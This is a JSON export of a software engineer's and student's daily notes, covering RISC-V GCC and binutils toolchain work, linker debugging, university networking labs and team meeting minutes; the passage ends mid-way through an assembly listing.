    "content": "# 2022-08-24\n---\n- [ ] pull request from your repo to the official core-v-binutils-gdb repo to merge all the assembler/linker work (Pietra?) (REBASE)\n- [x] pull request from your repo to the official core-v-gcc repo to merge all the gcc work (Pietra?) ✅ 2022-08-24 (CHECK WITH JEREMY FOR MSG)\n- [x] tagging of the core-v repos as being the zc* code freeze (Nandni) ✅ 2022-08-24\n- [x] a build and test run using the core-v repos to create the binary we will ship (Nandni) ✅ 2022-08-24\n- [x] a release note (Nandni) ✅ 2022-08-24\n- [ ] a final report and email from you to the customer with the deliverables (Pietra/Everyone)\n\n---\n\nAfter this is all signed off, we have some (big) housekeeping tasks to do.\n- roll forward core-v-binutils-gdb\n- roll forward core-v-gcc\n- submit with Jiawei the Zc* support to upstream binutils-gdb and gcc\n\nThese will carry on after you have headed off for holiday, university etc! ",
    "lastmodified": "2022-11-24T12:20:53.772915244Z",
    "tags": null
  },
  "/notes/daily/2022-08-25": {
    "title": "2022-08-25",
    "content": "# 2022-08-25\n---\n```\n../../../../../install/bin/riscv32-unknown-elf-gdb eh1.elf -ex 'source ../../../../../install/share/gdb/python/gdb/ovlymgr.py' -ex 'tar rem 192.168.0.134:3333' -ex load -ex 'b main.c:82' -ex \n```\n\nWhen I run:\n\n```\nscons -c target=eh1 \u0026\u0026 scons target=eh1\n```\n\nIt gives me the error:\n\n```\n/home/pietraferreira/projects/everest/development/install/bin/riscv32-unknown-elf-ranlib output/libs/lib_bsp.a\n/home/pietraferreira/projects/everest/development/install/bin/clang -o output/eh1.elf -nostartfiles -static -nostdlib -Wl,--wrap=malloc -Wl,--wrap=free -Wl,--wrap=open -Wl,--wrap=lseek -Wl,--wrap=read -Wl,--wrap=write -Wl,--wrap=fstat -Wl,--wrap=stat -Wl,--wrap=close -Wl,--wrap=link -Wl,--wrap=unlink -Wl,--wrap=execve -Wl,--wrap=fork -Wl,--wrap=getpid -Wl,--wrap=kill -Wl,--wrap=wait -Wl,--wrap=isatty -Wl,--wrap=times -Wl,--wrap=sbrk -Wl,--wrap=_exit -L. -Wl,-gc-sections -Wl,-Map=output/eh1.map -target riscv32-unknown-elf -mabi=ilp32 -g3 -march=rv32imac -mcmodel=medlow --gcc-toolchain=/home/pietraferreira/projects/everest/development/install --sysroot=/home/pietraferreira/projects/everest/development/install/riscv32-unknown-elf -moverlay -Wl,--grouping-file=../comrv-baremetal.csv -Wl,--defsym=__comrv_cache_size=4608 -Wl,--defsym=__comrv_cache_alignment_size=1024 -Wl,--defsym=__comrv_overlay_storage_size=8192 -Wl,-T/home/pietraferreira/projects/everest/development/riscv-fw-infrastructure/WD-Firmware/demo/build/../../board/nexys_a7_eh1/link.lds -L/home/pietraferreira/projects/everest/development/riscv-fw-infrastructure/WD-Firmware/demo/build/../../board/nexys_a7_eh1 -Wl,--start-group output/libs/lib_comrv.a output/libs/lib_comrv_baremetal_demo.a output/libs/lib_psp.a output/libs/lib_bsp.a -lc -lgcc -Wl,--end-group\n/home/pietraferreira/projects/everest/development/install/bin/riscv32-unknown-elf-ld: /home/pietraferreira/projects/everest/development/install/bin/riscv32-unknown-elf-ld: DWARF error: invalid or unhandled FORM value: 0x23\noutput/libs/lib_comrv.a(comrv.o): in function `no symbol':\ncomrv.c:(.text.comrvLoadTables+0x8): undefined reference to `__OVERLAY_GROUP_TABLE_START'\n/home/pietraferreira/projects/everest/development/install/bin/riscv32-unknown-elf-ld: comrv.c:(.text.comrvLoadTables+0xc): undefined reference to `__OVERLAY_GROUP_TABLE_START'\n/home/pietraferreira/projects/everest/development/install/bin/riscv32-unknown-elf-ld: comrv.c:(.text.comrvLoadTables+0x10): undefined reference to `__OVERLAY_MULTIGROUP_TABLE_END'\n/home/pietraferreira/projects/everest/development/install/bin/riscv32-unknown-elf-ld: comrv.c:(.text.comrvLoadTables+0x14): undefined reference to `__OVERLAY_MULTIGROUP_TABLE_END'\nclang-15: error: ld command failed with exit code 1 (use -v to see invocation)\nscons: *** [output/eh1.elf] Error 1\nscons: building terminated because of errors.\n```",
    "lastmodified": "2022-11-24T12:20:54.028098941Z",
    "tags": null
  },
  "/notes/daily/2022-09-01": {
    "title": "2022-09-01",
    "content": "# 2022-09-01\n---",
    "lastmodified": "2022-11-24T12:20:54.113900423Z",
    "tags": null
  },
  "/notes/daily/2022-09-30": {
    "title": "2022-09-30",
    "content": "# 2022-09-30\n---\nTo mount remote filesystem:\n\n- CiscoConnect using `academic\\2041368` as the login.\n- Then going to Finder -\u003e Go -\u003e Connect to Server...\n- Connect to `v-csfs01.ikb.brunel.ac.uk`, using `academic\\2041368`\n- Mounted :)\n\n## Ubuntu 1\n`10.0.2.4`\n\n## Ubuntu 2\n`10.0.3.4`",
    "lastmodified": "2022-11-24T12:20:54.143806815Z",
    "tags": null
  },
  "/notes/daily/2022-10-04": {
    "title": "2022-10-04",
    "content": "# 2022-10-04\n---\nStudents can:\n\n- Register for studies (matriculation) -\u003e involves enrolling\n- Enroll\n- Withdraw\n\nStudent receives certificate from student office.\n\nCertificates are print out by an employee.\n\nLectures send grading information to the student office.\n\nNotification system informs students (automatically) that a certificate has been issued.\n\nThere are two types of employees:\n\n1. Service employee (ServEmp) -\u003e administration of student data.\n2. Administration employee (AdminEmp) -\u003e remaining tasks\n3. All employees can issue information.\n\nAdminEmp -\u003e issue certificates when the students comes to collect them and create courses. They can then reserve lecture halls.",
    "lastmodified": "2022-11-24T12:20:54.196875215Z",
    "tags": null
  },
  "/notes/daily/2022-10-06": {
    "title": "2022-10-06",
    "content": "# 2022-10-06\n---\nTrying to better understand the `howto` table and how the linker retrieves/stores information as I can't seem to retrieve the value for the relocation, even though it seems to be retrieving the relocation itself.",
    "lastmodified": "2022-11-24T12:20:54.214976907Z",
    "tags": null
  },
  "/notes/daily/2022-10-11": {
    "title": "2022-10-11",
    "content": "# 2022-10-11\n---\nWe first get:\n\n```\nvalue = 65628\n*rel -\u003e r_offset = 2, r_info = 1760, r_addend = 0;\n\nhowto:\n\n$21 = {type = 224, size = 2, bitsize = 32, rightshift = 1, bitpos = 0,\n  complain_on_overflow = complain_overflow_unsigned, negate = 0, pc_relative = 1, partial_inplace = 0,\n  pcrel_offset = 1, src_mask = 0, dst_mask = 4293918720, special_function = 0x5555555eca6f \u003cbfd_elf_generic_reloc\u003e,\n  name = 0x55555572a20e \"R_RISCV_CVPCREL_UI12\"}\n\nvalue after getting the addend = 6\n\ntype = 224\n```\n\n\n\n",
    "lastmodified": "2022-11-24T12:20:54.338122249Z",
    "tags": null
  },
  "/notes/daily/2022-10-16": {
    "title": "2022-10-16 - CS2005 Lab 3 (HTTP)",
    "content": "# CS2005 Lab 3 - HTTP\n---\n1. The version of HTTP that the client and the server are running. Is it HTTP version 1.0 or 1.1?  \n\nVersion 1.1\n\n2. The language (if any) that the client indicates that it can accept.  \n\nText/HTML\n\n3. Identify the IP address of the client and the server.  \n\nClient: 10.0.2.4 and destination 10.0.2.254\n\n4. The status code returned from the server to the client.  \n\n200 OK\n\n5. The date and time that the retrieved HTML file last modified at the server.  \n\nSun, 03 Sep 2017 09:41:30 GMT.\n\n6. The length of the content (how many bytes) that is being returned to the client.  \n\n50 bytes\n\n7. Identify the raw data in the packet content window\n\n`\u003chtml\u003e\u003cbody\u003e\u003ch1\u003eFreeBSD works!\u003c/h1\u003e\u003c/body\u003e\u003c/html\u003e\\n`\n\n---\n1. How many HTTP GET requests are sent by the client to the server?  \n\n2\n\n2. What objects the client (browser) requests from the server?  \n\n`/` and `favicon.ico`\n\n3. The status code returned from the server to the client for each GET request.\n\n200 OK and 404 Not Found.\n\n---\n1. Inspect the contents of the first HTTP GET request from your browser to the server. Do you see an “IF-MODIFIED-SINCE” line in the HTTP GET?  \n\nNo.\n\n2. Inspect the contents of the server response. Did the server explicitly return the contents of the file? How can you tell?  \n\nIt did as I can see the header in the \"Line-Based Text Data\" section as it is displayed in the browser.\n\n3. Now inspect the contents of the second HTTP GET request from your browser to the server. Do you see an “IF-MODIFIED-SINCE:” line in the HTTP GET? If so, what information follows the “IF-MODIFIED-SINCE:” header?  \n\nNot on the next request but on the 5th one where we get the source (`/`). The information that follows is: Sun, 03 Sep 2017 09:41:30 GMT.\n\n4. What is the HTTP status code and phrase returned from the server in response to this second HTTP GET? Did the server explicitly return the contents of the file?\n\nStatus is 304 Not Modified. It did not return the content of the files because the browser couldn't retrieve it from the cache. If the file was modified when it was last accessed, then it would have returned the contents. However, it simply tried to retrieve the old file from its cached memory.\n\n---\n\n1. How many HTTP GET request messages did your browser send? Which packet number in the trace contains the GET message?  \n\n2 GET requests (one for favicon). Packet number 6 and 105.\n\n2. Which packet number in the trace contains the status code and phrase associated with the response to the HTTP GET request?  \n\n103.\n\n3. What are the status code and phrase in the response?  \n\nCode was 200 and message was OK.\n\n4. How many data-containing TCP segments were needed to carry the single HTTP response and the text? (It may be helpful to change the filter to `ip.addr==10.0.2.254` to see the full sequence of packets.)\n\n49 reassembled TCP segments.\n\n---\n1. How many HTTP GET request messages did your browser send?  \n\n3.\n\n2. Do all requests download objects from the same URI?\n\nYes they all come from the same server. However, `brunel-logo.png` is being referred from `images.html`.\n\n---\n1. What is the server’s response (status code and phrase) in response to the initial HTTP GET message from your browser?  \n\n\n\n2. When your browser sends the HTTP GET message for the second time, what new field is included in the HTTP GET message?\n\nAuthorization.\n\n# CS2005 Lab 4 - Distributed Systems\n---\nUbuntu1: 10.0.2.4/24\nUbuntu2: 10.0.3.4/24",
    "lastmodified": "2022-11-24T12:20:54.421609163Z",
    "tags": null
  },
  "/notes/daily/2022-10-20": {
    "title": "2022-10-20",
    "content": "# 2022-10-20\n---",
    "lastmodified": "2022-11-24T12:20:54.480184197Z",
    "tags": null
  },
  "/notes/daily/2022-10-24": {
    "title": "2022-10-24",
    "content": "# 2022-10-24\n---\n(gdb) p value\n$18 = 52428800",
    "lastmodified": "2022-11-24T12:20:54.559588075Z",
    "tags": null
  },
  "/notes/daily/2022-11-01": {
    "title": "2022-11-01",
    "content": "# 2022-11-01\n---\nGroup Meeting\n\nAttendants:\n\n- Sammy\n- Adriana\n- Zeeshan\n- Pietra\n- Emmanuel\n- spin_laden\n\nKey topics:\n\n- Work on Sprint Backlog.\n- Reviewed Product Backlog, focusing on defining the requirement types types for each user story and the user stories.\n- ",
    "lastmodified": "2022-11-24T12:20:54.595074892Z",
    "tags": null
  },
  "/notes/daily/2022-11-10": {
    "title": "2022-11-10",
    "content": "# 2022-11-10\n---\nQuick Meeting with Sammy\n\n13:18 to 13:45\n\n- Registration is fully working with a database connected to it, we just don't have the other pages.\n- Website fully animated with soundtrack.\n- We are using **XAMPP** to manage **mySQL** and **PHP**.\n- Sammy also added links to how to setup XAMPP on Discord.\n- Sammy and Adriana meet yesterday (09/11) for around 2h. They worked on setting up XAMPP/mySQL and discussed the main page and registration form.\n- Sammy helped me set up XAMPP and sent his files through Google Drive, he will push them to Git ASAP.",
    "lastmodified": "2022-11-24T12:20:54.6404773Z",
    "tags": null
  },
  "/notes/daily/2022-11-13": {
    "title": "2022 11 13",
    "content": "# 2022-11-13\n---\n|     | O5Client                                                                         |     | O5Server                                                                      |\n| --- | -------------------------------------------------------------------------------- | --- | ----------------------------------------------------------------------------- |\n|     |                                                                                  |     | (run O5Server)                                                                |\n|     | (run O5Client)                                                                   |     |                                                                               |\n|     |                                                                                  |     | SEND \"O5Server is ready\"                                                      |\n|     | RECEIVE \"O5Server is ready\"                                                      |     |                                                                               |\n|     |                                                                                  |     | (accept O5Client connection)                                                  |\n|     | WHILE NOT TERMINATED                                                             |     | WHILE NOT TERMINATED                                                          |\n|     |                                                                                  |     | SEND \"Welcome to O5AppShop [...] Choose and option: 1. User 2. Admin 3. Exit\" |\n|     | RECEIVE \"Welcome to O5AppShop [...] Choose and option: 1. User 2. Admin 3. Exit\" |     |                                                                               |\n|     | SEND \"1 (User)\" to O5Server                                                                                 |     |                                                                               |\n",
    "lastmodified": "2022-11-24T12:20:54.826848507Z",
    "tags": null
  },
  "/notes/daily/2022-11-16": {
    "title": "2022-11-16",
    "content": "# 2022-11-16\n---\nMeeting with Sammy (and Zeeshan!) \n\nAttendants:\n- Pietra\n- Zeeshan\n- Sammy\n\n14:06 - 16:55\n\nKey topics:\n- Discussed our target audience.\n- Discussed registration, if we should use PHP or NodeJS/Spring.\n- Currently the website doesn't complain if the email/username already exists.\n- Make the game properly appear as an overlay.\n- User name now appears in the screen while the user is playing the game.\n- Updated the UI, including adding the leaderboard.\n- We set up a meeting using the new Sesh bot on Discord.\n- Sammy has pushed all the work to GitHub.\n- Discussed how we are going to plan our first Sprint.",
    "lastmodified": "2022-11-24T12:20:54.853233933Z",
    "tags": null
  },
  "/notes/daily/2022-11-17": {
    "title": "2022-11-17",
    "content": "# 2022-11-17\n---\n## Sprint Planning\nThe What - the product owner describes the objective (goal) of the sprint and what backlog items contribute to that goals. The scrum team decides what can be done.\n\nGoals:\n- Get the repository and all team members set up.\n- Set up a first template for the web application.\n- Start work on **user registration**:\n    - Functional **home page**, where the user can login and also access the **game**.\n    - User can create an account, providing their email and password.\n    - User can access the account previously created, as their details will be stored in a database.\n    - User can't access their account if they are providing the incorrect details, for example password.\n- Start work on the **main game**:\n    - Bottles fall from the top of the screen.\n    - Bottles disappear when user clicks on them.\n    - User loses the game if the bottle touches the ground.\n    - Develop the UI for the game.\n    - Develop the leaderboard UI.\n\nBacklog Items:\n- **User Registration**\n- **Main Game**\n- **Home Page**\n\n- Prepare Database and Users.\n- Create database models and repositories.\n- Create input forms.\n- Authorise entered details if they match with database.\n- Save login information into a database.\n- ",
    "lastmodified": "2022-11-24T12:20:55.019718289Z",
    "tags": null
  },
  "/notes/daily/2022-11-20": {
    "title": "2022 11 20",
    "content": "# 2022 11 20\n---\n- [ ] Talk about approving PRs, don't ever approve without discussing with the group.\n- [ ] Always have one person to review it?\n    - Question stuff, add comments, make sure to actually review it.\n\n- [ ] Talk about the design stuff, like empathy diagrams.\n\n- [ ] Talk about Sprint planning.",
    "lastmodified": "2022-11-24T12:20:55.34392345Z",
    "tags": null
  },
  "/notes/daily/2022-11-21": {
    "title": "2022-11-21",
    "content": "# 2022-11-21\n---\n## Marine Pollution\n---\nMostly comes from land sources, 80%.\n\nTwo main types: chemicals and trash.\n\nPlastic is particularly problematic as a pollutant because it is very long-lasting.\n\nMicroplastic pollution migrates up the food chain, eventually becoming part of what humans eat.\n\nReduce, reuse, recycle.\n\nhttps://education.nationalgeographic.org/resource/marine-pollution\n\n---\nhttps://worldoceanday.school/wp-content/uploads/2019/06/WWF-Oceans-and-Plastics-KS2-Handbook-for-Teacher-29Aug-v2.pdf\n\nChildren can do activities to build their knowledge and understanding, making them more aware of the 'bigger picture' and how small actions, for example using a plastic straw, can have far reaching consequences.\n\n\"With a growing awareness of the part that they can play in creating a better future for our oceans, pupils will take a step on the journey to becoming global citizens and sustainability champions of the future\"\n\nOnly around 9% of all plastic is recycled.\n\nAnd remember the five Rs:  \n• Rethink – what things do you really need?  \n• Refuse plastic where you can – it can help make a point.  \n• Reduce the amount of plastic you use.  \n• Reuse items whenever you can.  \n• Recycle as much as possible\n\n---\nInstill good environmental habits and behaviour, impart change to parents and communities.\n\nEducation can also equip young people with skills that can help them develop innovative climate solutions.\n\nhttps://blogs.worldbank.org/endpovertyinsouthasia/tackling-plastic-pollution-and-climate-change-through-education",
    "lastmodified": "2022-11-24T12:20:55.16825676Z",
    "tags": null
  },
  "/notes/daily/2022-11-22": {
    "title": "2022-11-22",
    "content": "# 2022-11-22\n---\n## Open Source SG AGM\n---\nIm Pietra, as mentioned previously I'm a computer Science student at brunel university and a software engineer working for Embecosm. I have been involved with open source before, mainly through the Open Hardware group when I worked on porting one of their instruction sets. Why am I here? Well I do believe that code should be transparent and available to its users and would like to to get more involved, in any way I can really, in advocating that. \n\nMy experience is mainly with the GNU toolchain\n\nI think i can bring a different perspective by being a student and very early in my career.",
    "lastmodified": "2022-11-24T12:20:55.425611258Z",
    "tags": null
  },
  "/notes/daily/hardware-loops-gcc-corev": {
    "title": "Hardware Loops - COREV",
    "content": "# Hardware Loops (GCC) - COREV\n---\n```\n(define_insn \"set_hwloop_cvstart\"\n [(set (match_operand:SI 0 \"le_register_operand\" \"=t\")\n       (label_ref (match_operand 1 \"\" \"\" ))\n  )\n  (use (match_operand:SI 2 \"immediate_operand\" \"I\"))\n]\n \"\"\n \"cv.starti\\tx%2,%1\\t # loop setup, start\"\n [(set_attr \"type\" \"move\")\n  (set_attr \"mode\" \"SI\")]\n)\n\n(define_insn \"cv_starti\"\n  [(set(pc)\n       (us_plus (pc) \n                (ashift (label_ref (match_operand 1 \"\" \"\"))                 \n                        (1))))\n   (unspec [((\"match_operand:SI 0 \"immediate_operand\"   \"I\")\n             (label_ref (\"match_operand 1 \"\" \"\"))\n            )] UNSPECV_CV_STARTI)]\n  \"TARGET_COREV_LOOPS\" ;TODO: Add this condition\n  \"cv.starti %0,%1\") ;imm, symbol\n```\n\n******************************************************************************\n**MATCH_OPERAND**:\n\n| m   | n   | predicate           | constraint |\n| --- | --- | ------------------- | ---------- |\n| SI  | 0   | le_register_operand | =t           |\n\n- So it has `t` for operand 0, nothing for operand 1 and I for operand 2\n\nI -\u003e REFER BELOW -\u003e may be defined in a dependent fashion to permit immediate integer operands with explicit integer values in specified ranges. For example, 'I' can be defined to stand for the range of values 1 to 8 (any letter from I to P).\n\nt -\u003e REFER BELOW\n\nwhitespace -\u003e are ignored, can be inserted at any position except first. enables each alternative for different operands to be visually aligned in the machine description even if they have different number of constraints and modifiers.\n\n= -\u003e means that this operand is written to by this instruction: the previous value is discarded and replaced by new data.\n\nmatch_operand -\u003e placeholder for operand number *n* of the insn, so when constructing an insn, operand number *n* will be substituted.\n\nIt must satisfy the predicate or the inst pattern will not match.\n\nOperands must be consecutively counting from zero in each instruction pattern.\n\npredicate -\u003e it is a string that is the name of a function that accepts two arguments, an expression and a machine mode -\u003e m is the mode argument.\n\nconstraints -\u003e controls reloading and the choice of the best register class to use for a value.\n\ntherefore, predicate helps decide whether a given insn matches the pattern while the constraint plays no role in the decision, instead, it controls various decisions in the case of an insn which does match.\n\n## PREDICATE\n- Determines whether match_operand matches or not.\n\nAll predicates are boolean functions of two arguments: RTL expression that is being considered at that position and the machine mode that the match_operand specifies.\n\nThe first argument is called OP and the second called MODE .\n\nOperand predicates can allow operands that are not actually acceptable to the hardware, as long as the constraints give reload the ability to fix them up.\n\nOP must have the same mode, unless OP is a CONST_INT or integer CONST_DOUBLE.\n\n```\n;; Return nonzero if OP is a LE register.\n(define_predicate \"le_register_operand\"\n  (and (match_code \"reg\")\n       (match_test \"REGNO (op) == REG_LE0 || REGNO (op) == REG_LE1\")))\n```\n\nmatch_code -\u003e evaluates to true if OP or a specified subexpression of OP has one of given list of RTX (RTL expression), the operand is a string constant containing a comma-separated list of RTX code names, these are the codes for which MATCH_CODE will be true.\n\nmatch_test -\u003e has one operand, a string containing a C expression.\n\n---\nthere is a HWLOOP_REGISTER_FIRST in config/riscv/riscv.h:880i.\n\ndefine_register_constraint -\u003e name regclass docstring.\n\n- name -\u003e  will appear in the match_operand expression.\n- regclass -\u003e register class.\n- docstring -\u003e documenting the meaning of the constraint.\n\n```\n;; HW Loop register constraints, loop end\n(define_register_constraint \"t\" \"LE_REGS\"\n  \"LE0 or LE1.\")\n\n(define_constraint \"I\"\n  \"An I-type 12-bit signed immediate.\"\n  (and (match_code \"const_int\")\n       (match_test \"SMALL_OPERAND (ival)\")))\n```\n\n\n## CONSTRAINTS\nThe constraints are used when doing the register allocation and final instruction selection. Many architectures have constraints on the operands, such as m68k that has 16 registers (a0–a7 and d0–d7), but only d0–d7 are allowed in a muls instruction. This is expressed by a constraint telling the register allocator that it must use register d0–d7.\n\n- define_insn -\u003e template given is inserted into the insn list.\n\nThe compiler chooses the pattern with the right name and apply the operands, without regard for the RTL template or operand constraints.\n\ndefine_split and define_peephole -\u003e once the insn list is generated, various  optimisation passes happen like convert, replace and rearrange the insns.\n\nFinally the insn list's RTL is matched up with the RTL templates in the define_insn patterns, which are used to emit the final assembly code.\n\ndefine_insn acts like its unnamed, since the names are ignored.\n\n## INSTRUCTION PATTERNS\ndefine_insn is an RTL expression containing 4 to 5 operands:\n\n1. optional name.\n2. RTL template: describes the semantics of the instruction (match_operand, match_operator and match_dup for example).\n3. the condition: string which contains a C expression so when the compiler attempts to match the RTL against a pattern, the condition is evaluated it may not depend on the data that it is being matched, but only the target-machine-types flags.\n4. output template or output statement: either a string, or a fragment of C code that returns a string.\n5. OPTIONAL: insn attributes.\n\n```bash\nriscv32-unknown-elf-gcc -DN=10 -02 -Wall -march=rv32imc -mabi=ilp32 -S -o\n10.test.s test.c\n```\n```\nemit_insn (gen_cv_starti(ob0));\np debug_rtx(ob0)\n```\n\nCREATING LABELS AT THIS POINT, CANT PRINT THEM.\n\nLABEL WOULD BE END, BUT WHERE DOES IT PRINT IT?\n\nPULP PRE-SETS A LOOP START REGISTER AND COUNT TO 70 71 72 ALWAYS THAT, THE START WILL ALWAYS START AT 70.\n\nSo pulp pre-sets a register for loop start and count, it always goes from 70 then 71, 72. Meaning that the loop start will be always start.\n\n---\nEarlier we went in to emit label and made sure the value was passed in correctly\nand after the label we get a label number at the end of the function it says\n0 uses, so we went into another function which does correctly print out the\nlabel but we get the exact same results. \n\nWe think it is the pass_expand:execute in gcc/gcc/cfgexpand.c\n",
    "lastmodified": "2022-11-24T12:20:55.21369493Z",
    "tags": null
  },
  "/notes/daily/relocations-corev": {
    "title": "Relocations - COREV",
    "content": "# Relocations - COREV\n---\nwhat is complain and overflow?\n\nhowto_table in bfd/elfxx-riscv.c\n\nwhat is size?\nbitsize?\npc relative is a pc relative rellocation\n\nthey need to know what to put in each one\n\nit looks up in the table, what does every field mean?\n****************************************************************************************\nassembly notes:\nallocatable -\u003e goes into real memory\n\nsymbol table are not allocatable, they are just sections with useful information\n\nnop -\u003e does nothing -\u003e x0 is always 0, add x0, x0, x0 is a perfectly valid nop\n\n## RELOCATION\n\nConceptually, the linker merges one or more relocatable files to form the output. It first determines how to combine and locate the input files; then it updates the symbol values, and finally it perform the relocation.\n\n## RELOCATION TABLE\nreloc_howto_type howto_table[] \u003c- relocation table used for SHT_RELA sections -\u003e SHT_RELA is a section type, it identifies relocation entries with explicit addends, such as type Elf32_Rela for the 32-bit class of object files (https://docs.oracle.com/cd/E19683-01/816-1386/chapter6-94076/index.html)\n\n32 bit relocation -\u003e HOWTO of type R_RISCV_32 which is a runtime relocation with field of word32 and calculation S + A (symbol + addend), the addend is used to compute the value of the relocatable field while S represents the value of the symbol whose index reside in the relocation entry. \n\nThe relocation type specifies which bits to change and how to calculate their values.\n\n---\nWe declare labels for addresses, the computer can't do its full job without knowing the 'whole' program as so to determine addresses. Instead it just creates two tables to keep track of these names that will be needed to be replaced by addresses eventually.\n\nThe symbol table record the list of items in the files that can be used by the code, for example subprograms. Each entry in the table has the name of the label and its offset within this object file.\n\nThe relocation table records the list of items that this file needs (from other object files or libraries)\n\nHeader -\u003e where in the file the sections below are located\nText segment -\u003e contains all the source code\nData segment -\u003e combines all data and segments ?\nRelocation table -\u003e identifies the lines of code that need to be 'fixed'\nSymbol table -\u003e list of this file's reference-able labels\n\n---\n## CONTROL TRANSFER INSTRUCTIONS\nRV32I provides two types of control transfer instructions: unconditional jumps and conditional branches.\n\nJAL -\u003e jump and link instruction -\u003e encodes a signed offset in mutiples of 2 bytes -\u003e the offset is sign-extended and added to the address of the jump instruction to form the jump target address. JAL stores the address of the instruction following the jump (pc+4) into register rd. The standard software calling convention uses x1 as the return address register and x5 as an alternate link register.\n\nJALR -\u003e jumper and link register -\u003e the target address is obtained by adding the sign-extended 12-bit I-immediate to the register rs1, then setting the least_significant bit of the result to zero. The address of the instruction following the jump (pc+4) is written to resgister rd. Register x0 can be used as the destination if the result is not required.i\n\nLeast significant bit is the lowest bit in a series of numbers, it is either the leftmost or rightmost. If the LSB is on the right, the architecture is \"little endian\". If it is on the left, big endian. For example, in a little endian the LSB of 00000001 is 1.\n\nLUI (load upper immediate)\nAUIPC (add upper immediate to pc)\n\na word is 32 bits (4 bytes)\nzero-extend -\u003e pad with zeros\n\nif the symbol and the call site are not in the same compile unit, then compiler doesn't know the symbol offsets. AUIPC and JALR pair will be generated to guarantee the function call can reach the symbol. Linker knows the symbol address if its a static linker, can transfer the pair to a single JAL.\n\nThe linker rewrites offsets according to relocation records\n\nThe relocation record contains info like: which instructions need to be relocated (the offsets), which symbols are involved with the reloc and how to relocate the files relative to the symbols.\n\nSo the type (R_RISCV_32) tells how to relocate the field relative to symbols.\n\nSymbol can be something like bar + 0 (symb name + addend)",
    "lastmodified": "2022-11-24T12:20:55.302745342Z",
    "tags": null
  },
  "/notes/daily/testing-relaxation-corev": {
    "title": "Testing Relaxation - COREV",
    "content": "# Testing Relaxation - COREV\n---\n`readelf -r` on .o files -\u003e looks for particular relocations -\u003e instead of -a\nit checks if we're getting the right relocation\n\nConstruct a file that we know it is going to relax, so you could create an assembly file with a cv.start and a reference to something that it is away and put in between stuff that we know it will get relaxed away. So something that will force the loop to shorten.\n\n- Things get shorten from 32bits to 16bits.\n- What we need to do is: add x3, x4, x5.\n- They are all register we can do a compressed add.\n- Need to see what the compressed instructions are find a comp instruction that can only sort out at relaxation time how can we force something to relax.\n\n- So that we know that the file is being shorten\n\n- Create cv.start and put the label (L2) and put the instruction in between so it will assemble thinking it has 4bits but knowing it has to relax down to 2bits.\n\nExample:\n\n```assembly\n      cv.starti   0,L2\n      lui         x3,const ; materialize const to 0, linker will relax\n      addi        x3,x3,50 ; (doesnt know what const is)\nL2:   nop\n```\n\n- Assemble this then link it, linker command line you can set constant to 0 in ld it could be an immediate as well.\n\nNormal call:\n\n```assembly\nauipc   ra(register A),100(const)\njalr    ra\n```\n\nThe linker, because it has the info about the dist between the functions can fold that down to just a 'jal' instruction.\n\n- So it takes a program counter, add 100 to it and stores in ra. \n\n``` assembly\nfunc: ret\n;; the actual test code\n      cv.starti   0,L2\n      auipc       ra,ret ; linker, will fold these two instructions\n      jalr        ra     ; down to jal ra, func \nL2:   nop\n```\n\n- Two 32bit instructions, but we will end up with them folded down to a single jal instruction, causing the relocation.\n\n- In .d file, look at disassembly and make sure it got reduced as expected.\n\nRELU12\nRELU5",
    "lastmodified": "2022-11-24T12:20:55.612408757Z",
    "tags": null
  },
  "/notes/daily/tiger-optimisation-memset-memcpy": {
    "title": "Tiger Optimisation (memset/memcpy)",
    "content": "# Tiger Optimisation (memset/memcpy)\n---\n## Optimising expansion of memcpy/memset using hardware loops\nCurrently memcpy and memset get expanded to a list of stores and loads for small sized values. If the size of the memcpy/memset is very large, then generate a call to implementation, which is provided by newlib.\n\nEd thinks we can do better by using the hardware loop instructions. So for a large memset/memcpy, instead of generating a call to implementation we should be able to generate an inline hardware loop.\n\n### The approach\n1. Replace the implementation of memset/memcpy with a handwritten assembly implementation using a hardware loop in newlib. This should give an idea of whether it is worth expanding this in the compiler.\n\nIf I look [here] (https://tiger.git.embecosm.com/tiger/newlib/-/tree/tiger-3.3.0-newlib/newlib/libc/machine/bsc)\n\nI'll need to add a `memset.s` and `memcpy.s` to the directory above.\n\nThen update the `Makefile.am` to refer to `memset.s` and `memcpy.s` (like `setjmp.s` in the `lib_a_SOURCES` variable in that file)\n\nFinally run `automake` from that directory to regenerate `Makefile.in`\n\n(Might run into assembly bugs)\n\n## More stuff\nThis is the optimisation: https://tiger.git.embecosm.com/tiger/llvm-project/-/issues/113\n\nI need to write a memset.S and a memcpy.S using hardware loops.\n\nThere's a file newlib/libgloss/bsc/crt0.S which has an example of some assembly code. It looks like this:\n\n```assembly\n  .text\n  .global _start\n  .type   _start, @function\n_start:\n  # clear bss \n  mviu r0, __bss_start\n  mviu r1, __bss_end\n  mvib r2, 0\n.Lbss_clear_start:\n  ge r0, r1\n  jc .Lbss_clear_end\n  stw r2, r0, 1\n  j .Lbss_clear_start\n.Lbss_clear_end:\n\n  # For now set the stack pointer to the end of the data section.\n  # For now just set the stack pointer to the end of the data section.\n  # Since the stack pointer rises and nothing is allocated to the memory\n  # afterwards this essentially allocates any remaining memory to the stack.\n  mviu sp, __stack_start\n\n  # Set argc and argv with 0\n  mvib r0, 0\n  mvib r1, 0\n  cl main\n  cl exit\n  .size  _start, .-_start\n```\n\nThe start of memset.S would probably look like this:\n\n```\n  .text\n  .global memset\n  .type memset,@function\nmemset:\n  ... \u003c\u003c\u003c stuff goes here\n  ret\n```\n\nAs for how to write a memset, you have three arguments: a pointer to the destination, a value to write, and a size to write. Where these arguments are depends on the calling convention which is defined in the compiler in `BSCCallingConv.td`, but the short answer is that they will be in the registers r0, r1 and r2\n\nAs for the instructions you can use - there's documentation of the instructions here: https://tiger.git.embecosm.com/tiger/bst/-/blob/master/simple-iss-cronus/doc/cronus.md\n\nYou might also need to look at the `BSCInstrInfo.td` in the compiler to work out the exact syntax though.\n\nA good starting point for assembly might be to see what gets generated at the moment.  Code for a really simple memset looks like this:\n\n```c\nvoid memset(char *dst, int value, int size) {\n  for (int i = 0; i \u003c size; i++)\n    dst[i] = value;\n}\n```\n\nIf you compile that with `bsc-elf-clang -O1 -S test.c` you'll get a `test.s` which might be a good example of what the assembly looks like\n\nIt looks like this:\n\n```assembly\n        .text\n        .file   \"test.c\"\n        .globl  memset                          # -- Begin function memset\n        .type   memset,@function\nmemset:                                 # @memset\n# %bb.0:                                # %entry\n        mvib    r3, 1\n        lt      r2, r3\n        jc      .LBB0_3\n# %bb.1:                                # %for.body.lr.ph\n        mvib    r3, 0\n.LBB0_2:                                # %for.body\n                                        # =\u003eThis Inner Loop Header: Depth=1\n        add     r4, r0, r3\n        nop\n        stw     r1, r4, 0\n        